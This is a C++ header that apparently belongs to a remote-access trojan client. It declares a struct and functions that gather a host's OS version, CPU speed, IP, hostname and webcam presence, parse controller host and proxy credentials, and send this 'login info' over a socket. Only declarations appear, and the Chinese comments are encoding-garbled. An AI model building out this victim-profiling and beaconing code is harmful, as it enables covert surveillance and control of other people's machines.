#pragma once
#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>

//#include "decode.h"
#include "until.h"
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")
#include "ClientSocket.h"
typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ
	int				CPUClockMhz;	// CPU��Ƶ
	IN_ADDR			IPAddress;		// �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			HostName[50];	// ������
	bool			bIsWebCam;		// �Ƿ�������ͷ
	DWORD			dwSpeed;		// ����
}LOGININFO;


void SplitLoginInfo(char *lpDecodeString, char **lppszHost, LPDWORD lppPort, char **lppszProxyHost, LPDWORD lppProxyPort,
	char **lppszProxyUser, char **lppszProxyPass);

bool getLoginInfo(char *lpURL, char **lppszHost, LPDWORD lppPort, char **lppszProxyHost, LPDWORD lppProxyPort,
	char **lppszProxyUser, char **lppszProxyPass);

// Get System Information
DWORD CPUClockMhz();


bool IsWebCam();

UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize);

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed);
